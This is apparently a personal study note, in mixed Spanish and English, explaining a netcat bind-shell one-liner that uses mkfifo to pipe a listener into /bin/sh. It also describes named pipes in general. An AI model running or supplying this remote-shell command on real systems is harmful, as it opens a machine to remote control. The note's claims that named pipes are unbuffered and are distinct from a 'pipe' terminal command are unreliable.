---
{"dg-publish":true,"permalink":"/named-pipe/","hide":"true"}
---


```shell
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

1. El comando `mkfifo /tmp/f` crea un named pipe (tubería con nombre) en el directorio `/tmp` y lo llama `f`.
2. then starts a netcat listener
3. connects the **input of the listener to the output of the** named **pipe** `nc -lvnp <PORT> < /tmp/f`
4. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh` `| /bin/sh`
5. ending the stderr output stream into stdout, `2>&1`
6. and sending stdout itself into the input of the named pipe, thus completing the circle. `/bin/sh >/tmp/f`
![Pasted image 20240402184247.png](/img/user/Pasted%20image%2020240402184247.png)


Aquí te explico paso a paso lo que hace:

- `mkfifo`: Esta es la orden que le indica al sistema operativo que quieres crear un named pipe.
- `/tmp/f`: Esta es la ruta y el nombre del named pipe que se creará.
    - `/tmp`: Es un directorio temporal común en sistemas operativos Unix-like donde se almacenan archivos temporales.
    - `f`: Es el nombre arbitrario que se le asigna al named pipe. Puedes elegir cualquier nombre que te convenga.

Un named pipe funciona como un canal de comunicación unidireccional entre dos procesos. Un proceso puede escribir datos en el named pipe y otro proceso diferente puede leer esos mismos datos.

**Algunas características importantes de los named pipes:**

- **Unidireccional:** Los datos solo fluyen en una dirección, del proceso que escribe (productor) al proceso que lee (consumidor).
- **Sin búfer:** Los datos se escriben directamente en el named pipe y se leen inmediatamente por el otro proceso. No hay almacenamiento intermedio, lo que los hace adecuados para flujos de datos continuos.
- **Con nombre:** A diferencia de las tuberías estándar (sin nombre) creadas con el comando `pipe` en la terminal, los named pipes se crean con un nombre específico. Esto permite que múltiples procesos puedan acceder al mismo named pipe si conocen su nombre.